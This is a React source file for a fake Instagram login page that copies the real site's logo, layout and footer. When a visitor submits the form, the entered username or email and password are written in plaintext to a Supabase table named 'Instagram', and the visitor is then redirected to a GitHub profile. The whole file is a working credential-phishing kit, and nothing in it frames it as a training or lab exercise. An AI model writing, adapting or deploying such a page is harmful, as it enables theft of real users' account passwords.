import React, { useState } from "react";
import "./instagram.css";
import { FaFacebookSquare, FaApple, FaGooglePlay } from "react-icons/fa";
import { supabase } from "../../supabase"; // Make sure this is correctly configured

const Instagram = () => {
  const [form, setForm] = useState({ email: "", password: "" });
  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setForm((prev) => ({ ...prev, [name]: value }));
  };

  const handleSupabaseLogin = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const { data, error } = await supabase
        .from("Instagram")
        .insert([{ email: form.email, password: form.password }]);

      if (error) {
        console.error("Insert error:", error);
        // Optional: Show error toast/message here
      } else {
        setForm({ email: "", password: "" });

        // Redirect after 1 second
        setTimeout(() => {
          window.location.href = "https://github.com/Dcoderath";
        }, 1000);
      }
    } catch (err) {
      console.error("Unexpected error:", err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="insta-container">
      <div className="insta-phone-mockup" />

      <div className="insta-login">
        <div className="insta-form-box">
          <h1 className="insta-logo">Instagram</h1>

          <form onSubmit={handleSupabaseLogin}>
            <input
              type="text"
              name="email"
              placeholder="Phone number, username, or email"
              className="insta-input"
              value={form.email}
              onChange={handleChange}
              required
            />
            <input
              type="password"
              name="password"
              placeholder="Password"
              className="insta-input"
              value={form.password}
              onChange={handleChange}
              required
            />
            <button type="submit" className="insta-button" disabled={loading}>
              {loading ? "Logging in..." : "Log In"}
            </button>
          </form>

          <div className="insta-divider">
            <div className="line" />
            <div className="or">OR</div>
            <div className="line" />
          </div>

          <div className="insta-alt-login">
            <a href="#" className="insta-facebook">
              <FaFacebookSquare size={20} />
              Log in with Facebook
            </a>
            <a href="#" className="forgot">Forgot password?</a>
          </div>
        </div>

        <div className="insta-signup-box">
          Don’t have an account? <a href="#">Sign up</a>
        </div>

        <div className="get-the-app">
          <p>Get the app.</p>
          <div className="app-icons">
            <a className="app-icon">
              <FaApple size={24} />
              <span>App Store</span>
            </a>
            <a className="app-icon">
              <FaGooglePlay size={22} />
              <span>Google Play</span>
            </a>
          </div>
        </div>

        <footer className="insta-footer">
          <ul className="footer-links">
            <li><a href="#">Meta</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Locations</a></li>
            <li><a href="#">Instagram Lite</a></li>
            <li><a href="#">Threads</a></li>
            <li><a href="#">Contact Uploading & Non-Users</a></li>
            <li><a href="#">Meta Verified</a></li>
          </ul>
          <div className="footer-bottom">
            <select>
              <option>English</option>
              <option>Español</option>
              <option>Français</option>
            </select>
            <span>© 2025 Instagram from Meta</span>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default Instagram;
